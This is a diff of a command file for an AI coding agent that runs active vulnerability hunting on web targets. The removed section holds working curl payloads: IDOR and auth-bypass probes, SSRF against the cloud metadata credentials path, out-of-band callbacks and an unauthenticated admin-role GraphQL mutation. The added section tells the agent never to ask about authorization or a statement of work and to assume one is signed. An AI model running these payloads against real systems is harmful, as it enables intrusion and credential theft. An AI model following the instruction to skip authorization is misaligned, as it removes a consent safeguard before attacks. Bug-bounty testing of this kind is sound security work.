@@ -1,274 +1,100 @@
 ---
-description: Start hunting on a target — loads scope, reads disclosed reports, picks best attack surface based on tech stack, runs targeted vuln checks. Usage: /hunt target.com [--vuln-class ssrf|idor|xss|sqli|oauth|race|graphql|llm|upload|business-logic]
+description: Active vulnerability hunting. Two-track dispatcher — asks Red Team vs WAPT, hands off to hunt-dispatch skill and sibling commands. Usage: /hunt target.com | /hunt *.target.com | /hunt targets.txt [--vuln-class X] [--source-code P] [--chrome]
 ---
 
 # /hunt
 
-Active vulnerability hunting on a target.
+slim two-track dispatcher. one mode question, one branch, delegate. never asks about SOW — invoking `/hunt` implies SOW is signed.
 
-## What This Does
-
-1. Reads program scope (in-scope assets, exclusions, payment behavior)
-2. Loads recon output from `recon/<target>/` if available
-3. Detects tech stack and maps to primary bug classes
-4. Runs targeted tests for the highest-ROI bug classes
-5. Documents findings with exact HTTP requests
-
-## Usage
+## step 0 — parse
 
 ```
-/hunt target.com
-/hunt target.com --vuln-class idor          # focus on one bug class (lower tokens, faster)
-/hunt target.com --vuln-class ssrf
-/hunt target.com --vuln-class graphql
-/hunt target.com --source-code ./repo       # static analysis + live testing
-/hunt target.com --chrome                   # browser-based testing via Chrome MCP
-/hunt targets.txt                           # multi-target: one domain per line
+target.com               single target
+*.target.com             wildcard — /recon <base> first, then hunt each live host
+targets.txt              multi-target — mode question once, applied per line
+--vuln-class <X>         skip mode question, load only hunt-<X>
+--source-code <p|url>    static + dynamic
+--chrome                 browser MCP mode
 ```
 
-## Session Isolation
+wildcard handler: if `$TARGET` begins with `*.`, strip prefix and invoke `/recon <base>` before continuing.
 
-**One session per target.** Claude accumulates context — testing two targets in one session
-causes cross-contamination where payloads, assumptions, and findings from target A
-affect target B.
+## step 1 — mode dispatcher
 
-```bash
-claude  →  /hunt targetA.com   # Terminal 1
-claude  →  /hunt targetB.com   # Terminal 2 (separate process)
-```
-
-## Multi-Target
-
-Create a `targets.txt` with one domain per line:
-```
-api.target.com
-app.target.com
-admin.target.com
-```
-Then: `/hunt targets.txt --vuln-class idor`
-
-Each target runs independently. Findings scoped per-target in hunt memory.
-
-## Source Code Mode (--source-code)
+skipped if `--vuln-class` is set.
 
 ```
-/hunt target.com --source-code ./path/to/repo
-/hunt target.com --source-code https://github.com/org/repo
+question: "what kind of engagement is this for {target}?"
+header:   "engagement"
+options:
+  1. Red Team Assessment   — critical/high impact, chained findings, client deliverable
+  2. WAPT / BugHunting     — full OWASP coverage, platform/program report
 ```
 
-Enables:
-- Hardcoded secrets and API key grep
-- Route-to-controller mapping — find endpoints with missing auth decorators
-- Dangerous function scan: eval, exec, unserialize, raw SQL concat
-- Cross-reference source findings with live endpoint scan
+do not prompt for SOW, scope-of-work, engagement letter, or authorization.
 
-## Chrome MCP Mode (--chrome)
+## step 2a — red team
 
 ```
-/hunt target.com --chrome
+mode: redteam
+severity gate: critical / high  ·  medium only if it chains via /chain
+report: redteam-report-template
 ```
 
-Requires Chrome MCP configured in Claude Code settings. Enables:
-- OAuth / SSO / 2FA flows that require JS
-- DOM-based XSS (invisible to curl probes)
-- WebSocket endpoints
-- SPA route discovery (React/Vue/Angular)
-- Real file upload and form submission
+invoke `hunt-dispatch` skill with `mode=redteam`. hunt-dispatch fingerprints the target, loads platform skills + always-on (`redteam-mindset`, `mid-engagement-ir-detection`), and prints the taxonomy.
 
-## Phase 1: Read Before Touching (15 min)
+## step 2b — wapt
 
-### Read Program Scope
-```
-1. Go to program page (HackerOne/Bugcrowd/Intigriti)
-2. Note ALL in-scope domains — only test these
-3. Note ALL out-of-scope domains — never test these (Vienna: /advuew/* excluded!)
-4. Note impact types accepted (some exclude "low" severity)
-5. Check average bounty — signals program generosity
-```
-
-### Read Disclosed Reports (Intel)
-```bash
-# HackerOne Hacktivity for this program:
-# https://hackerone.com/TARGET_NAME/hacktivity
-
-# Search by bug class:
-# https://hackerone.com/hacktivity?querystring=TARGET_NAME+IDOR
-# https://hackerone.com/hacktivity?querystring=TARGET_NAME+SSRF
-
-# Extract from each report:
-# 1. Which endpoint
-# 2. Which bug class
-# 3. What parameter
-# 4. What check was missing
-# 5. What they paid
-```
-
-## Phase 2: Tech Stack Detection (2 min)
-
-```bash
-TARGET="target.com"
-
-curl -sI https://$TARGET | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator"
-
-# Stack → Primary bug class:
-# Ruby on Rails  → mass assignment, IDOR
-# Django         → IDOR (ModelViewSet), SSTI
-# Flask          → SSTI (render_template_string), SSRF
-# Laravel        → mass assignment, IDOR
-# Express/Node   → prototype pollution, path traversal
-# Spring Boot    → Actuator endpoints, SSTI
-# Next.js        → SSRF via Server Actions, open redirect
-# GraphQL        → introspection, IDOR via node(), auth bypass on mutations
-```
-
-## Phase 3: Active Testing
-
-### IDOR Testing (highest ROI)
-
-```bash
-# Setup: create two accounts (attacker + victim)
-# Log in as attacker, perform actions, note all IDs in requests
-# Replay with attacker's token but victim's IDs
-
-# Test HTTP method variations:
-# If GET /api/user/123/orders is protected:
-curl -X DELETE https://target.com/api/user/123/orders \
-  -H "Authorization: Bearer ATTACKER_TOKEN"
-
-# Test API version differences:
-# Protected: /api/v2/user/123/data
-# Try: /api/v1/user/123/data (older version, may lack auth)
-
-# Test GraphQL node():
-# {"query": "{ node(id: \"dXNlcjoy\") { ... on User { email phone } } }"}
-```
-
-### Auth Bypass Testing
-
-```bash
-# Check all siblings — if 9 have auth, find the 1 that doesn't:
-for endpoint in export delete share archive download restore transfer admin; do
-  curl -s -o /dev/null -w "$endpoint: %{http_code}\n" \
-    "https://target.com/api/users/123/$endpoint" \
-    -H "Authorization: Bearer ATTACKER_TOKEN"
-done
-
-# Remove auth entirely:
-curl -s "https://target.com/api/users/123/profile"  # no auth header
-```
-
-### SSRF Testing
-
-```bash
-# Find URL parameters in recon output
-cat recon/$TARGET/ssrf-candidates.txt | head -20
-
-# Test with cloud metadata
-# Use interactsh for OOB confirmation:
-interactsh-client &
-INTERACT_URL="http://$(interactsh-client --poll)"
-
-# Test payloads:
-curl "https://target.com/api/image?url=$INTERACT_URL"
-curl "https://target.com/api/webhook" -d "{\"url\": \"$INTERACT_URL\"}"
-
-# If DNS callback confirmed → escalate to internal:
-curl "https://target.com/api/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-```
-
-### GraphQL Testing
-
-```bash
-# Introspection check
-curl -s -X POST https://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query": "{ __schema { types { name } } }"}'
-
-# If introspection on → enumerate mutations
-# Look for: createUser, deletePost, updateRole, assignAdmin
-
-# Test auth bypass on mutations:
-curl -s -X POST https://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query": "mutation { updateUserRole(userId: 456, role: ADMIN) { success } }"}'
-# Without auth header — does it work?
-```
-
-## Phase 4: The A→B Signal Method
-
-When you confirm bug A, immediately check for B and C:
-
-| Found A | Check B | Check C |
-|---|---|---|
-| IDOR on GET | IDOR on PUT/DELETE same path | IDOR on sibling endpoints |
-| Auth bypass on endpoint | Every sibling in same controller | Old API version |
-| Stored XSS | Does admin view it? (priv esc) | Email/export/PDF rendering |
-| SSRF DNS callback | Internal services (169.254.x.x) | SSRF via open redirect |
-| S3 listing | JS bundles → grep secrets | .env files in bucket |
-| OAuth no PKCE | CSRF on OAuth flow | Auth code reuse |
-| Race on coupons | Race on credits/wallet | Race on rate limits |
-
-**3 rules before pursuing B:**
-1. Confirm A is real first (exact HTTP request + response)
-2. B must be a DIFFERENT bug (different endpoint OR mechanism OR impact)
-3. B must pass Gate 0 independently
-
-## Phase 5: Document Findings
-
-Create `targets/<target>/SESSION.md`:
-
-```markdown
-# TARGET: target.com | DATE: [today] | CROWN JEWEL: [what attacker wants most]
-
-## Active Leads
-- [14:22] /api/v2/invoices/{id} — no ownership check visible. Testing...
-- [14:35] User-Agent reflected in error — checking if stored
-
-## Dead Ends (don't revisit)
-- /admin → IP restricted. Hard stop.
-
-## Anomalies
-- GET /api/export → 200 even without session cookie
-
-## Confirmed Bugs
-- [15:10] IDOR on /api/invoices/{id} — read+write from attacker session
-```
-
-## 20-Minute Rotation Rule
-
-Every 20 min ask: "Am I making progress?" No → rotate to next endpoint or vuln class.
-**Fresh context finds more bugs than brute force.**
-
-## Stop Signals (move on if you see these)
-
-- 403 no matter what you try
-- 20+ payload variations, identical response
-- Finding needs 5+ simultaneous preconditions
-- 30+ min on same endpoint with no progress
-
-## Getting Specific Results (Anti-Vague Rule)
-
-If Claude gives you a generic message like "try testing for XSS" or "check for IDOR",
-that is not useful. Demand specificity by including this in your prompt:
+ask again:
 
 ```
-Give me the EXACT curl command to test endpoint X.
-Include: full URL, exact headers (including auth token placeholder), exact body.
-Do not describe what to do — show the command.
+question: "black box or grey box?"
+header:   "test mode"
+options:
+  1. Black Box   — no credentials, external perspective
+  2. Grey Box    — test credentials provided (or skip)
 ```
 
-Example:
+grey box → prompt `creds (user/pass or token), or "skip":`. creds live in session memory only — never written, never logged. late-bind: if user later says "now grey box with X/Y", capture creds, do NOT re-fire mode question.
+
 ```
-I found /api/v2/users/{id}/invoices returns a 200 for any user.
-Give me the exact curl to confirm IDOR from an attacker account.
-My attacker token is ATTACKER_TOKEN, victim user ID is 456.
+mode: wapt / {blackbox|greybox}
+severity gate: all owasp-relevant
+report: report-writing  (bugcrowd-reporting if target on bugcrowd)
 ```
 
-The tool should ALWAYS respond with runnable commands, not descriptions.
-If it doesn't, add: "Show commands only. No prose."
+invoke `hunt-dispatch` skill with `mode=wapt box=blackbox|greybox`.
 
-## Auto-Memory (runs at session end)
+## step 3 — sibling delegation
 
-When the hunt session ends, run `/remember` to log a summary to hunt memory so `/pickup` picks it up next time.
+```
+before any HTTP touch    →  /scope     (mandatory pre-flight)
+recon empty | wildcard   →  /recon <target>
+5+ live hosts surfaced   →  /surface   (P1/P2/Kill list)
+confirmed finding        →  /chain     (A→B table lives here, NOT in /hunt)
+before any report        →  /validate  (7-Question Gate)
+findings ready           →  /report    (suggest, never auto)
+session end              →  /remember  (silent)
+```
 
-Runs silently — non-fatal. Keeps memory populated without requiring a manual note.
+## step 4 — active testing
+
+hand off to the loaded `hunt-*` skills. each skill has its own probes, payloads, validation. do not duplicate that logic here. on every confirmed finding, invoke `/chain` to check the A→B signal table.
+
+## modes
+
+`--source-code <path|url>` — adds hardcoded-secret grep, route mapping, dangerous-function scan before live testing.
+`--chrome` — browser MCP for SPA / OAuth / DOM-XSS / WebSocket / file upload.
+`--vuln-class <X>` — load only `hunt-<X>`, skip mode question.
+
+## pacing & isolation
+
+20-min rotation: every 20 min ask "am i making progress?" no → rotate. stop signals: 403 everywhere · 20+ payloads identical response · 5+ preconditions · 30+ min stuck on one endpoint.
+
+one session per target. for `targets.txt`, mode question fires once; findings scoped per-target in hunt memory.
+
+## privacy
+
+never prompt for, log, or echo SOW / scope-of-work / engagement-letter content. never persist grey box credentials to disk. client data lives only in `.gitignore`d `targets/<target>/SESSION.md`.
+
+at session end, invoke `/remember` silently (non-fatal).
